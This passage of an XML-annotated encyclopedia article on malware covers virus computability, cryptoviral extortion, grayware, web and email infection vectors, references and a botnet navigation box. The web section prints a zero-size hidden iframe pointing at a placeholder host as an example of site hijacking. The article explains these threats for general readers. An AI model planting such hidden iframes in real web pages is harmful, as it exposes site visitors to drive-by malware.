RSA</link>) presented a rigorous proof that, in the general case, algorithmically determining whether a virus is or is not present is Turing undecidable.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2210%22])">10</ref> This problem must not be mistaken for that of determining, within a broad class of programs, that a virus is not present; this problem differs in that it does not require the ability to recognize all viruses. Adleman's proof is perhaps the deepest result in malware <link xlink:type="simple" xlink:href="../136/442136.xml">
computability theory</link> to date and it relies on <link xlink:type="simple" xlink:href="../426/51426.xml">
Cantor's diagonal argument</link> as well as the <link xlink:type="simple" xlink:href="../668/13668.xml">
halting problem</link>. Ironically, it was later shown by Young and Yung that Adleman's work in <link xlink:type="simple" xlink:href="../432/18934432.xml">
cryptography</link> is ideal in constructing a virus that is highly resistant to reverse-engineering by presenting the notion of a <link xlink:type="simple" xlink:href="../459/3852459.xml">
cryptovirus</link>.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2211%22])">11</ref> A cryptovirus is a virus that contains and uses a public key and randomly generated <link xlink:type="simple" xlink:href="../042/53042.xml">
symmetric cipher</link> <link xlink:type="simple" xlink:href="../971/105971.xml">
initialization vector</link> (IV) and <link xlink:type="simple" xlink:href="../941/63941.xml">
session key</link> (SK). In the cryptoviral extortion attack, the virus hybrid encrypts <link xlink:type="simple" xlink:href="../935/157935.xml">
plaintext</link> data on the victim's machine using the randomly generated IV and SK.  The IV+SK are then encrypted using the virus writer's <link xlink:type="simple" xlink:href="../222/24222.xml">
public key</link>. In theory the victim must negotiate with the virus writer to get the IV+SK back in order to decrypt the <link xlink:type="simple" xlink:href="../294/10294.xml">
ciphertext</link> (assuming there are no backups). Analysis of the virus reveals the public key, not the IV and SK needed for decryption, or the private key needed to recover the IV and SK. This result was the first to show that <link xlink:type="simple" xlink:href="../543/7543.xml">
computational complexity theory</link> can be used to devise malware that is robust against reverse-engineering.</p>
<p>

Another growing area of computer virus research is to mathematically model the infection behavior of worms using models such as <link>
Lotka–Volterra equation</link>s, which has been applied in the study of biological virus. Various virus propagation scenarios have been studied by researchers such as propagation of computer virus, fighting virus with virus like predator codes,<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2212%22])">12</ref><ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2213%22])">13</ref> effectiveness of patching etc.</p>

</sec>
<sec>
<st>
Grayware</st>
<p>

Grayware<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2214%22])">14</ref> (or greyware) is a general term sometimes used as a classification for applications that behave in a manner that is annoying or undesirable, and yet less serious or troublesome than malware.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2215%22])">15</ref> Grayware encompasses spyware, adware, dialers, joke programs, remote access tools, and any other unwelcome files and programs apart from viruses that are designed to harm the performance of computers on your network. The term has been in use since at least as early as September 2004.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2216%22])">16</ref></p>
<p>

Grayware refers to applications or files that are not classified as <link xlink:type="simple" xlink:href="../679/19167679.xml">
viruses</link> or <link xlink:type="simple" xlink:href="../056/30056.xml">
trojan horse</link> programs, but can still negatively affect the performance of the computers on your network and introduce significant security risks to your organization.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2217%22])">17</ref> Often grayware performs a variety of undesired actions such as irritating users with <link xlink:type="simple" xlink:href="../320/466320.xml">
pop-up</link> windows, tracking user habits and unnecessarily exposing computer vulnerabilities to attack. </p>
<p>

<list>
<entry level="1" type="bullet">

<link xlink:type="simple" xlink:href="../951/28951.xml">
Spyware</link> is software that installs components on a computer for the purpose of recording Web surfing habits (primarily for marketing purposes). Spyware sends this information to its author or to other interested parties when the computer is online. Spyware often downloads with items identified as 'free downloads' and does not notify the user of its existence or ask for permission to install the components. The information spyware components gather can include user keystrokes, which means that private information such as login names, passwords, and credit card numbers are vulnerable to theft. Spyware gathers data, such as account user names, passwords, credit card numbers, and other confidential information, and transmits it to third parties.</entry>
</list>
</p>
<p>

<list>
<entry level="1" type="bullet">

<link xlink:type="simple" xlink:href="../616/2616.xml">
Adware</link> is software that displays advertising banners on Web browsers such as Internet Explorer and Mozilla Firefox. While not categorized as malware, many users consider adware invasive. Adware programs often create unwanted effects on a system, such as annoying popup ads and the general degradation in either network connection or system performance. Adware programs are typically installed as separate programs that are bundled with certain free software. Many users inadvertently agree to installing adware by accepting the <link xlink:type="simple" xlink:href="../764/49764.xml">
End User License Agreement (EULA)</link> on the free software. Adware are also often installed in tandem with spyware programs. Both programs feed off of each other's functionalities - spyware programs profile users' Internet behavior, while adware programs display targeted ads that correspond to the gathered user profile.</entry>
</list>
</p>

</sec>
<sec>
<st>
Web and spam</st>
<p>


&amp;lt;iframe
  src="http://example.net/out.ph
  p?s_id=11" width=0 height=0 /&amp;gt;
If an intruder can gain access to a website, it can be hijacked with a single HTML element.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2218%22])">18</ref></p>
<p>

The <invention wordnetid="105633385" confidence="0.8">
<link xlink:type="simple" xlink:href="../139/33139.xml">
World Wide Web</link></invention>
 is a criminals' preferred pathway for spreading malware.  Today's <link xlink:type="simple" xlink:href="../369/19336369.xml">
web threats</link> use combinations of malware to create infection chains.  About one in ten Web pages may contain malicious code.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2219%22])">19</ref>  </p>

<ss1>
<st>
Wikis and blogs</st>
<p>

Innocuous wikis and blogs are not immune to hijacking. It has been reported that the German edition of Wikipedia has recently been used as an attempt to vector infection. Through a form of <accomplishment wordnetid="100035189" confidence="0.8">
<event wordnetid="100029378" confidence="0.8">
<action wordnetid="100037396" confidence="0.8">
<act wordnetid="100030358" confidence="0.8">
<psychological_feature wordnetid="100023100" confidence="0.8">
<feat wordnetid="100036762" confidence="0.8">
<link xlink:type="simple" xlink:href="../243/730243.xml">
social engineering</link></feat>
</psychological_feature>
</act>
</action>
</event>
</accomplishment>
, users with ill intent have added links to web pages that contain malicious software with the claim that the web page would provide detections and remedies, when in fact it was a lure to infect.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2220%22])">20</ref></p>

</ss1>
<ss1>
<st>
Targeted SMTP threats</st>
<p>

Targeted <message wordnetid="106598915" confidence="0.8">
<protocol wordnetid="106665108" confidence="0.8">
<direction wordnetid="106786629" confidence="0.8">
<rule wordnetid="106652242" confidence="0.8">
<link xlink:type="simple" xlink:href="../675/27675.xml">
SMTP</link></rule>
</direction>
</protocol>
</message>
 threats also represent an emerging attack vector through which malware is propagated. As users adapt to widespread <practice wordnetid="100410247" confidence="0.8">
<event wordnetid="100029378" confidence="0.8">
<act wordnetid="100030358" confidence="0.8">
<psychological_feature wordnetid="100023100" confidence="0.8">
<activity wordnetid="100407535" confidence="0.8">
<link xlink:type="simple" xlink:href="../368/28368.xml">
spam</link></activity>
</psychological_feature>
</act>
</event>
</practice>
 attacks, cybercriminals distribute <link xlink:type="simple" xlink:href="../229/2148229.xml">
crimeware</link> to target one specific organization or industry, often for financial gain.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2221%22])">21</ref></p>

</ss1>
<ss1>
<st>
HTTP and FTP</st>
<p>

Infections via "drive-by" download are spread through the <invention wordnetid="105633385" confidence="0.8">
<link xlink:type="simple" xlink:href="../139/33139.xml">
Web</link></invention>
 over <link xlink:type="simple" xlink:href="../104/2701104.xml">
HTTP</link> and <link xlink:type="simple" xlink:href="../289/53289.xml">
FTP</link> when resources containing spurious keywords are indexed by legitimate search engines, as well as when JavaScript is surreptitiously added to legitimate websites and advertising networks.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%2222%22])">22</ref></p>

</ss1>
</sec>
<sec>
<st>
See also</st>
<p>

<list>
<entry level="1" type="bullet">

<link xlink:type="simple" xlink:href="../065/13442065.xml">
Privacy-invasive software</link></entry>
<entry level="1" type="bullet">

<accomplishment wordnetid="100035189" confidence="0.8">
<event wordnetid="100029378" confidence="0.8">
<action wordnetid="100037396" confidence="0.8">
<act wordnetid="100030358" confidence="0.8">
<psychological_feature wordnetid="100023100" confidence="0.8">
<feat wordnetid="100036762" confidence="0.8">
<link xlink:type="simple" xlink:href="../885/55885.xml">
Computer insecurity</link></feat>
</psychological_feature>
</act>
</action>
</event>
</accomplishment>
</entry>
<entry level="1" type="bullet">

<link xlink:type="simple" xlink:href="../296/1362296.xml">
Firewall (networking)</link></entry>
<entry level="1" type="bullet">

<accomplishment wordnetid="100035189" confidence="0.8">
<event wordnetid="100029378" confidence="0.8">
<action wordnetid="100037396" confidence="0.8">
<act wordnetid="100030358" confidence="0.8">
<psychological_feature wordnetid="100023100" confidence="0.8">
<feat wordnetid="100036762" confidence="0.8">
<link xlink:type="simple" xlink:href="../243/730243.xml">
Social engineering (security)</link></feat>
</psychological_feature>
</act>
</action>
</event>
</accomplishment>
</entry>
<entry level="1" type="bullet">

<link xlink:type="simple" xlink:href="../256/91256.xml">
Spy software</link></entry>
<entry level="1" type="bullet">

<link xlink:type="simple" xlink:href="../354/8158354.xml">
Targeted threat</link></entry>
<entry level="1" type="bullet">

 
Web security exploits</entry>
<entry level="1" type="bullet">

 <link xlink:type="simple" xlink:href="../455/33455.xml#xpointer(//*[./st=%22Overload_causes%22])">
Web server overload causes</link></entry>
<entry level="1" type="bullet">

 <accomplishment wordnetid="100035189" confidence="0.8">
<event wordnetid="100029378" confidence="0.8">
<action wordnetid="100037396" confidence="0.8">
<act wordnetid="100030358" confidence="0.8">
<psychological_feature wordnetid="100023100" confidence="0.8">
<feat wordnetid="100036762" confidence="0.8">
<link xlink:type="simple" xlink:href="../994/346994.xml">
Browser exploit</link></feat>
</psychological_feature>
</act>
</action>
</event>
</accomplishment>
</entry>
<entry level="1" type="bullet">

 <link xlink:type="simple" xlink:href="../311/288311.xml#xpointer(//*[./st=%22Writing+Web+applications%22])">
Security in Web applications</link></entry>
<entry level="1" type="bullet">

 <accomplishment wordnetid="100035189" confidence="0.8">
<event wordnetid="100029378" confidence="0.8">
<action wordnetid="100037396" confidence="0.8">
<act wordnetid="100030358" confidence="0.8">
<psychological_feature wordnetid="100023100" confidence="0.8">
<feat wordnetid="100036762" confidence="0.8">
<link xlink:type="simple" xlink:href="../621/744621.xml">
Privilege escalation</link></feat>
</psychological_feature>
</act>
</action>
</event>
</accomplishment>
</entry>
</list>
</p>

</sec>
<sec>
<st>
References</st>

<p>

<reflist>
<entry id="1">
http://www.microsoft.com/technet/security/alerts/info/malware.mspx</entry>
<entry id="2">
National Conference of State Legislatures <weblink xlink:type="simple" xlink:href="http://www.ncsl.org/programs/lis/cip/viruslaws.htm">
Virus/Contaminant/Destructive Transmission Statutes by State</weblink></entry>
<entry id="3">
jcots.state.va.us/2005%20Content/pdf/Computer%20Contamination%20Bill.pdf [|18.2-152.4:1 Penalty for Computer Contamination]</entry>
<entry id="4">
"<weblink xlink:type="simple" xlink:href="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_exec_summary_internet_security_threat_report_xiii_04-2008.en-us.pdf">
Symantec Internet Security Threat Report: Trends for July-December 2007 (Executive Summary)</weblink>"&#32;(PDF)&#32;29.&#32;  Symantec Corp.&#32;(April 2008).&#32;Retrieved on <link>
2008-05-11</link>.</entry>
<entry id="5">
F-Secure Corporation&#32;(December 4, 2007).&#32;"<weblink xlink:type="simple" xlink:href="http://www.f-secure.com/f-secure/pressroom/news/fs_news_20071204_1_eng.html">
F-Secure Reports Amount of Malware Grew by 100% during 2007</weblink>". <link xlink:type="simple" xlink:href="../097/304097.xml">
Press release</link>. &#32;Retrieved on <link>
2007-12-11</link>.</entry>
<entry id="6">
"<weblink xlink:type="simple" xlink:href="http://www.f-secure.com/f-secure/pressroom/news/fsnews_20080331_1_eng.html">
F-Secure Quarterly Security Wrap-up for the first quarter of 2008</weblink>".&#32;  F-Secure&#32;(March 31, 2008).&#32;Retrieved on <link>
2008-04-25</link>.</entry>
<entry id="7">
<weblink xlink:type="simple" xlink:href="http://www.pcworld.com/article/id,116841-page,1/article.html">
PC World - Zombie PCs: Silent, Growing Threat</weblink></entry>
<entry id="8">
John von Neumann, "Theory of Self-Reproducing Automata", Part 1: Transcripts of lectures given at the University of Illinois, Dec. 1949, Editor: A. W. Burks, University of Illinois, USA, 1966.</entry>
<entry id="9">
Fred Cohen, "Computer Viruses", PhD Thesis, University of Southern California, ASP Press, 1988.</entry>
<entry id="10">
L. M. Adleman, "An Abstract Theory of Computer Viruses", Advances in Cryptology---Crypto '88, LNCS 403, pages 354-374, 1988.</entry>
<entry id="11">
A. Young, M. Yung, "Cryptovirology: Extortion-Based Security Threats and Countermeasures," IEEE Symposium on Security &amp; Privacy, pages 129-141, 1996.</entry>
<entry id="12">
H. Toyoizumi, A. Kara. Predators: Good Will Mobile Codes Combat against Computer Viruses. Proc. of the 2002 New Security Paradigms Workshop, 2002</entry>
<entry id="13">
Zakiya M. Tamimi, Javed I. Khan, <weblink xlink:type="simple" xlink:href="http://www.medianet.kent.edu/publications/ICCCE06DL-2virusabstract-TK.pdf">
Model-Based Analysis of Two Fighting Worms</weblink>, IEEE/IIU Proc. of ICCCE '06, Kuala Lumpur, Malaysia, May 2006, Vol-I, Page 157-163</entry>
<entry id="14">
"<weblink xlink:type="simple" xlink:href="http://mpc.byu.edu/Exhibitions/Of%20Earth%20Stone%20and%20Corn/Activities/Native%20American%20Pottery.dhtml">
Other meanings</weblink>".&#32;Retrieved on <link>
2007-01-20</link>. The term "grayware" is also used to describe a kind of Native American pottery and has also been used by some working in computer technology as slang for the human brain. "<weblink xlink:type="simple" xlink:href="http://www.techweb.com/encyclopedia/defineterm.jhtml?term=grayware">
grayware definition</weblink>".&#32;  TechWeb.com.&#32;Retrieved on <link>
2007-01-02</link>.</entry>
<entry id="15">
"<weblink xlink:type="simple" xlink:href="http://webopedia.com/TERM/g/greyware.html">
Greyware</weblink>".&#32;<it>What is greyware? - A word definition from the Webopedia Computer Dictionary</it>.&#32;Retrieved on <link>
2006-06-05</link>.</entry>
<entry id="17">
"<weblink xlink:type="simple" xlink:href="http://www.boll.ch/fortinet/assets/Grayware.pdf">
Fortinet WhitePaper PROTECTING NETWORKS AGAINST SPYWARE ADWARE AND OTHER FORMS OF GRAYWARE</weblink>"&#32;(PDF).&#32;Retrieved on <link>
2007-01-20</link>.</entry>
<entry id="16">
Antony Savvas.&#32;"<weblink xlink:type="simple" xlink:href="http://www.computerweekly.com/Articles/2004/09/28/205554/the-network-clampdown.htm">
The network clampdown</weblink>".&#32;  Computer Weekly.&#32;Retrieved on <link>
2007-01-20</link>.</entry>
<entry id="19">
"<weblink xlink:type="simple" xlink:href="http://news.bbc.co.uk/2/hi/technology/6645895.stm">
Google searches web's dark side</weblink>", BBC News&#32;(May 11, 2007).&#32;Retrieved on <link>
2008-04-26</link>.&nbsp;</entry>
<entry id="18">
Zittrain, Jonathan (Mike Deehan, producer).&#32;(<link>
2008-04-17</link>).&#32;<weblink xlink:type="simple" xlink:href="http://cyber.law.harvard.edu/interactive/events/2008/04/zittrain">
<it>Berkman Book Release: The Future of the Internet - And How to Stop It''</it></weblink>&#32;[video/audio].&#32;Cambridge, MA, USA:&#32;Berkman Center, The President and Fellows of Harvard College.&#32;Retrieved on <link>
2008-04-21</link>.</entry>
<entry id="21">
<weblink xlink:type="simple" xlink:href="http://www.avinti.com/download/market_background/whitepaper_email_crimeware_protection.pdf">
"Protecting Corporate Assets from E-mail Crimeware," Avinti, Inc., p.1</weblink> </entry>
<entry id="20">
<weblink xlink:type="simple" xlink:href="http://www.tech2.com/india/news/telecom/wikipedia-hijacked-to-spread-malware/2667/0">
Wikipedia Hijacked to Spread Malware</weblink></entry>
<entry id="22">
F-Secure&#32;(March 31, 2008).&#32;"<weblink xlink:type="simple" xlink:href="http://www.f-secure.com/f-secure/pressroom/news/fsnews_20080331_1_eng.html">
F-Secure Quarterly Security Wrap-up for the first quarter of 2008</weblink>". <link xlink:type="simple" xlink:href="../097/304097.xml">
Press release</link>. &#32;Retrieved on <link>
2008-03-31</link>.</entry>
</reflist>
</p>

</sec>
<sec>
<st>
External links</st>

<p>

<image location="none" width="50px" src="Wiktionary-logo-en.svg">
<caption>

Wiktionary
</caption>
</image>

Look up  in <web_site wordnetid="106359193" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../658/156658.xml">
Wiktionary</link></web_site>
, the free dictionary.</p>
<p>

<list>
<entry level="1" type="bullet">

<weblink xlink:type="simple" xlink:href="http://www.antiphishing.org/reports/APWG_CrimewareReport.pdf">
US Department of Homeland Security Identity Theft Technology Council report "The Crimeware Landscape: Malware, Phishing, Identity Theft and Beyond"</weblink></entry>
<entry level="1" type="bullet">

 <weblink xlink:type="simple" xlink:href="http://www.microsoft.com/emea/itsshowtime/sessionh.aspx?videoid=359">
Video: Mark Russinovich - Advanced Malware Cleaning</weblink></entry>
<entry level="1" type="bullet">

 <weblink xlink:type="simple" xlink:href="http://www.daemon.be/maarten/targetedattacks.html">
An analysis of targeted attacks using malware</weblink></entry>
<entry level="1" type="bullet">

 <weblink xlink:type="simple" xlink:href="http://www.geekstogo.com/forum/Malware-Removal-Guides-Tutorials-f121.html">
Malware Removal Guides and Tutorials</weblink></entry>
<entry level="1" type="bullet">

 <weblink xlink:type="simple" xlink:href="http://news.bbc.co.uk/2/hi/technology/7232752.stm">
Malicious Programs Hit New High</weblink> -retrieved Feb 8, 2008</entry>
<entry level="1" type="bullet">

 <weblink xlink:type="simple" xlink:href="http://www.malware.com.br">
Malware Block List</weblink></entry>
</list>
</p>


<p>

<table style=";" class="navbox" cellspacing="0">
<row>
<col style="padding:2px;">
<table style="width:100%;background:transparent;color:inherit;;" class="nowraplinks collapsible autocollapse " cellspacing="0">
<row>
<header colspan="2" style=";" class="navbox-title">
<link xlink:type="simple" xlink:href="../268/636268.xml">
Botnets</link></header>
</row>
<row style="height:2px;">

</row>
<row>
<col style=";;" class="navbox-group">
Main articles</col>
<col style="text-align:left;border-left:2px solid #fdfdfd;width:100%;padding:0px;;;" class="navbox-list navbox-odd">
<system wordnetid="104377057" confidence="0.8">
<artifact wordnetid="100021939" confidence="0.8">
<instrumentality wordnetid="103575240" confidence="0.8">
<link xlink:type="simple" xlink:href="../268/636268.xml">
Botnet</link></instrumentality>
</artifact>
</system>
&nbsp;·  <link xlink:type="simple" xlink:href="../010/6010.xml">
Computer worms</link>&nbsp;·  <link xlink:type="simple" xlink:href="../901/20901.xml">
Malware</link>&nbsp;·  <link xlink:type="simple" xlink:href="../607/1569607.xml">
Malbot</link>&nbsp;·  </col>
</row>
<row style="height:2px">

</row>
<row>
<col style=";;" class="navbox-group">
Notable botnets</col>
<col style="text-align:left;border-left:2px solid #fdfdfd;width:100%;padding:0px;;;" class="navbox-list navbox-even">
<system wordnetid="104377057" confidence="0.8">
<artifact wordnetid="100021939" confidence="0.8">
<instrumentality wordnetid="103575240" confidence="0.8">
<link xlink:type="simple" xlink:href="../258/12970258.xml">
Storm botnet</link></instrumentality>
</artifact>
</system>
&nbsp;·  <system wordnetid="104377057" confidence="0.8">
<artifact wordnetid="100021939" confidence="0.8">
<instrumentality wordnetid="103575240" confidence="0.8">
<link xlink:type="simple" xlink:href="../240/16810240.xml">
Kraken botnet</link></instrumentality>
</artifact>
</system>
&nbsp;·  <system wordnetid="104377057" confidence="0.8">
<artifact wordnetid="100021939" confidence="0.8">
<instrumentality wordnetid="103575240" confidence="0.8">
<link xlink:type="simple" xlink:href="../772/18511772.xml">
Srizbi botnet</link></instrumentality>
</artifact>
</system>
</col>
</row>
</table>
</col>
</row>
</table>
</p>



</sec>
</bdy>
</article>
